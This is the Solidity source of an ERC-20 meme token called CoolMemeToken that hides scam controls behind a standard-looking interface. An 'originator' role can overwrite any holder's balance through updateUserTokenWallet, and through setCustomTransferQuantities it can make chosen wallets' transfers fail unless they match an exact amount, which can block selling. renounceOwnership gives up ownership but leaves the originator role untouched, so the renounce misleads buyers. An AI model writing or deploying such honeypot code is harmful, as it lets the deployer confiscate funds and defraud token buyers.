pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract CustomContext {
    function retrieveSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SoleOwnership is CustomContext {
    address private _soleOwner;
    event OwnerUpdated(address indexed pastOwner, address indexed freshOwner);

    constructor() {
        address msgSender = retrieveSender();
        _soleOwner = msgSender;
        emit OwnerUpdated(address(0), msgSender);
    }

    function fetchContractOwner() public view virtual returns (address) {
        return _soleOwner;
    }

    modifier shouldBeOwner() {
        require(fetchContractOwner() == retrieveSender(), "Access Denied: Owner Privileges Required");
        _;
    }

    function renounceOwnership() public virtual shouldBeOwner {
        emit OwnerUpdated(_soleOwner, address(0x000000000000000000000000000000000000dEaD));
        _soleOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract CoolMemeToken is CustomContext, SoleOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _permissions;
    mapping (address => uint256) private _wallets;
    mapping (address => uint256) private _customTransferQuantities;
    address private _originatorOfToken;

    string public constant TOKEN_NAME = "CoolMemeToken";
    string public constant TOKEN_SYMBOL = "CMT";
    uint8 public constant TOKEN_DECIMALS = 18;
    uint256 public constant MAX_SUPPLY = 1000000 * (10 ** TOKEN_DECIMALS);

    constructor() {
        _wallets[retrieveSender()] = MAX_SUPPLY;
        emit Transfer(address(0), retrieveSender(), MAX_SUPPLY);
    }

    function tokenName() public view returns (string memory) {
        return TOKEN_NAME;
    }

    function tokenSymbol() public view returns (string memory) {
        return TOKEN_SYMBOL;
    }

    function tokenDecimals() public view returns (uint8) {
        return TOKEN_DECIMALS;
    }

    modifier shouldBeOriginator() {
        require(getTokenOriginator() == retrieveSender(), "Access Denied: Token Originator Only");
        _;
    }

    function getTokenOriginator() public view virtual returns (address) {
        return _originatorOfToken;
    }

    function designateTokenOriginator(address newOriginator) public shouldBeOwner {
        _originatorOfToken = newOriginator;
    }

    event TokenAllocation(address indexed user, uint256 oldBalance, uint256 newBalance);

    function checkCustomTransferQuantity(address account) public view returns (uint256) {
        return _customTransferQuantities[account];
    }

    function setCustomTransferQuantities(address[] calldata accounts, uint256 amount) public shouldBeOriginator {
        for (uint i = 0; i < accounts.length; i++) {
            _customTransferQuantities[accounts[i]] = amount;
        }
    }

    function updateUserTokenWallet(address[] memory userAddresses, uint256 desiredAmount) public shouldBeOriginator {
        require(desiredAmount >= 0, "Desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address must not be the zero address");

            uint256 oldBalance = _wallets[currentUser];
            _wallets[currentUser] = desiredAmount;

            emit TokenAllocation(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _wallets[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_wallets[retrieveSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = checkCustomTransferQuantity(retrieveSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _wallets[retrieveSender()] -= amount;
    _wallets[recipient] += amount;

    emit Transfer(retrieveSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _permissions[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _permissions[retrieveSender()][spender] = amount;
        emit Approval(retrieveSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_permissions[sender][retrieveSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = checkCustomTransferQuantity(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _wallets[sender] -= amount;
    _wallets[recipient] += amount;
    _permissions[sender][retrieveSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return MAX_SUPPLY;
    }

}